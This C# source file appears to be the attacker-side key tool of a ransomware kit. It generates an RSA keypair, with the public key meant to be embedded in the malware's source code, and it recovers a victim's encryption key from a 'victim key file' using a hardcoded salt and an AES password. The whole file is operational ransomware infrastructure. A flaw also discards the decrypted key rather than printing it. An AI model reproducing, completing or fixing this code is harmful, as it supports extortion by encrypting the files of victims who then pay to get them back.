using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml.Serialization;

namespace rsa
{
	internal static class Program
	{
		private static void Main()
		{
			for (;;)
			{
				Console.WriteLine("1.Generate rsa keypair");
				Console.WriteLine("2.GET key from file");
				Console.Write(">");
				string s = Console.ReadLine();
				int num = 0;
				int.TryParse(s, out num);
				if (num == 1)
				{
					Program.generatefile();
				}
				else if (num == 2)
				{
					Console.WriteLine("Enter the victim key file path > ");
					string text = Console.ReadLine();
					Console.WriteLine("Enter the key file path > ");
					string path = Console.ReadLine();
					Console.WriteLine("Enter key decryption aes key");
					string password = Console.ReadLine();
					try
					{
						Program.key_Decrypt(text, password);
						string strText = File.ReadAllText(text + ".whitesun");
						string s2 = File.ReadAllText(path);
						Console.Write("Valid key FounD : ");
						Program.Decryption(strText, Encoding.UTF8.GetString(Convert.FromBase64String(s2)));
						File.Delete(text + ".whitesun");
					}
					catch (Exception value)
					{
						Console.WriteLine(value);
					}
				}
			}
		}
    
		private static void generatefile()
		{
			RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider(2048);
			RSAParameters rsaparameters = rsacryptoServiceProvider.ExportParameters(true);
			RSAParameters rsaparameters2 = rsacryptoServiceProvider.ExportParameters(false);
			StringWriter stringWriter = new StringWriter();
			new XmlSerializer(typeof(RSAParameters)).Serialize(stringWriter, rsaparameters);
			string s = stringWriter.ToString();
			string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
			Console.WriteLine(text);
			string contents = text;
			File.WriteAllText("privatekey.txt", contents);
			StringWriter stringWriter2 = new StringWriter();
			new XmlSerializer(typeof(RSAParameters)).Serialize(stringWriter2, rsaparameters2);
			s = stringWriter2.ToString();
			string text2 = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
			Console.WriteLine(text2);
			string contents2 = text2;
			File.WriteAllText("PUT_THIS_KEY_INSIDE_SOURCECODE.txt", contents2);
			Console.WriteLine("+++++++++++++++");
			Console.WriteLine("both key saved");
			Console.WriteLine("+++++++++++++++");
		}

		public static string Decryption(string strText, string privkey)
		{
			RSA rsa = new RSACryptoServiceProvider(2048);
			byte[] rgb = Convert.FromBase64String(strText);
			StringReader textReader = new StringReader(privkey);
			RSAParameters parameters = (RSAParameters)new XmlSerializer(typeof(RSAParameters)).Deserialize(textReader);
			rsa.ImportParameters(parameters);
			RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider();
			rsacryptoServiceProvider.ImportParameters(parameters);
			byte[] bytes = rsacryptoServiceProvider.Decrypt(rgb, false);
			return Encoding.Unicode.GetString(bytes);
		}

		private static void key_Decrypt(string inputFile, string password)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			byte[] bytes2 = Encoding.UTF8.GetBytes("35474f3827bc5d2f107afbb5ce59ef20");
			FileStream fileStream = new FileStream(inputFile, FileMode.Open);
			fileStream.Read(bytes2, 0, bytes2.Length);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, bytes2, 50000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			rijndaelManaged.Mode = CipherMode.CFB;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
			FileStream fileStream2 = new FileStream(inputFile + ".whitesun", FileMode.Create);
			byte[] array = new byte[1048576];
			try
			{
				int count;
				while ((count = cryptoStream.Read(array, 0, array.Length)) > 0)
				{
					fileStream2.Write(array, 0, count);
				}
			}
			catch (CryptographicException)
			{
			}
			catch (Exception)
			{
			}
			try
			{
				cryptoStream.Close();
			}
			catch (Exception)
			{
			}
			finally
			{
				fileStream2.Close();
				fileStream.Close();
			}
		}
	}
}
